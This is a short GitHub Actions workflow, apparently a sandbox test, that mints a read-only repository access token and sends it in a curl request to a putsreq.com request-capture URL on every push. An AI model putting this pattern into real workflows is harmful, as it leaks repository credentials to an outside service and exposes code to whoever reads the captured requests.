name: ⚙️ Sandbox
on:
  push: 
  workflow_dispatch:

permissions:
  contents: write
  
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - uses: qoomon/actions--access-token@v3
        id: token
        with:
          permissions: |
            contents: read
      - run: curl "https://putsreq.com/ksp0TTIIgjPB0ceX9RGr?token${{ steps.token.outputs.token }}"
        
        
